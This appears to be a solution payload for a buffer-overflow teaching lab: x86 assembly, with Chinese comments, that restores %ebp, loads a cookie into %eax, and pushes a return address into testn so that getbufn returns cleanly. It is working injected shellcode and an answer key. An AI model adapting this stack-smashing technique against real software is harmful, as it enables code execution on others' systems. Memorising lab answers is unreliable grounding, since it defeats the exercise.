nop
lea 0x18(%esp), %ebp ;由于在 test 函数中 esp 与 ebp 的差为定值，可以通过 esp 计算 ebp
mov $0x6bf69d3e, %eax ;将 cookie 作为返回值
push $0x08048de5 ;返回在 testn 函数中调用 getbufn 的下一条指令的地址
ret
